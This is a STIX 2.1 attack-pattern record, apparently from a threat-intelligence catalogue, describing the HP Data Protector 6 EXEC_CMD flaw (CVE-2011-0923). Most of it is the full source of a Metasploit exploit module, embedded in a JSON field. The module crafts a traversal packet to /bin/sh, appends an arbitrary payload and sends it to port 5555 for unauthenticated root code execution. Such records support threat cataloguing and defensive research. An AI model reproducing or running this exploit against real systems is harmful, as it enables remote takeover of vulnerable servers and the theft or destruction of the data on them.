{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f98d8f3e-a9e5-4b81-a662-735b66f72fe9",
    "created": "2024-08-14T16:57:53.415831Z",
    "modified": "2024-08-14T16:57:53.415836Z",
    "name": "HP Data Protector 6 EXEC_CMD Remote Code Execution",
    "description": " This exploit abuses a vulnerability in the HP Data Protector service. This flaw allows an unauthenticated attacker to take advantage of the EXEC_CMD command and traverse back to /bin/sh, this allows arbitrary remote code execution under the context of root. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/hp_data_protector_cmd_exec.rb",
            "external_id": "hp_data_protector_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0923"
        },
        {
            "source_name": "reference",
            "url": "http://hackarandas.com/blog/2011/08/04/hp-data-protector-remote-shell-for-hpux"
        },
        {
            "source_name": "reference",
            "url": "https://community.rapid7.com/thread/2253"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'HP Data Protector 6 EXEC_CMD Remote Code Execution',\n      'Description'     => %q{\n        This exploit abuses a vulnerability in the HP Data Protector service. This\n        flaw allows an unauthenticated attacker to take advantage of the EXEC_CMD\n        command and traverse back to /bin/sh, this allows arbitrary remote code\n        execution under the context of root.\n      },\n      'Author'          =>\n        [\n          'ch0ks',          # poc\n          'c4an',           # msf poc\n          'wireghoul',      # Improved msf\n          'Javier Ignacio'  #Verified on A06.20\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2011-0923'],\n          [ 'OSVDB', '72526'],\n          [ 'ZDI', '11-055'],\n          [ 'URL', 'http://hackarandas.com/blog/2011/08/04/hp-data-protector-remote-shell-for-hpux'],\n          [ 'URL', 'https://community.rapid7.com/thread/2253' ]\n        ],\n      'DisclosureDate'  => '2011-02-07',\n      'Platform'        => %w{ linux unix },\n      'Arch'            => ARCH_CMD,\n      'Payload'         =>\n        {\n          'Space'       => 10000,\n          'DisableNops' => true,\n          'Compat'      => { 'PayloadType' => 'cmd' }\n        },\n      'Targets'         =>\n        [\n          [ 'HP Data Protector 6.10/6.11/6.20 on Linux', {}]\n        ],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options([Opt::RPORT(5555),])\n  end\n\n  def exploit\n\n    user = rand_text_alpha(4)\n\n    packet = \"\\x00\\x00\\x00\\xa4\\x20\\x32\\x00\\x20\"\n    packet << user*2\n    packet << \"\\x00\\x20\\x30\\x00\\x20\"\n    packet << \"SYSTEM\"\n    packet << \"\\x00\\x20\\x63\\x34\\x61\\x6e\"\n    packet << \"\\x20\\x20\\x20\\x20\\x20\\x00\\x20\\x43\\x00\\x20\\x32\\x30\\x00\\x20\"\n    packet << user\n    packet << \"\\x20\\x20\\x20\\x20\\x00\\x20\"\n    packet << \"\\x50\\x6f\\x63\"\n    packet << \"\\x00\\x20\"\n    packet << \"NTAUTHORITY\"\n    packet << \"\\x00\\x20\"\n    packet << \"NTAUTHORITY\"\n    packet << \"\\x00\\x20\"\n    packet << \"NTAUTHORITY\"\n    packet << \"\\x00\\x20\\x30\\x00\\x20\\x30\\x00\\x20\"\n    packet << \"../../../../../../../../../../\"\n\n    shell_mio = \"bin/sh\"\n\n    shell = shell_mio\n    shell << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    shell << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    shell << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    shell << payload.encoded\n    shell << \"\\n\"\n\n    sploit = packet + shell\n\n    begin\n      print_status(\"Sending our commmand...\")\n      connect\n      sock.put(sploit)\n      print_status(\"Waiting ...\")\n      handler\n\n      # Read command output from socket if cmd/unix/generic payload was used\n      if (datastore['CMD'])\n        res = sock.get_once(-1, 10)\n        print_status(res.to_s) if not res.empty?\n      end\n\n    rescue\n      print_error(\"Error in connection or socket\")\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-02-07",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}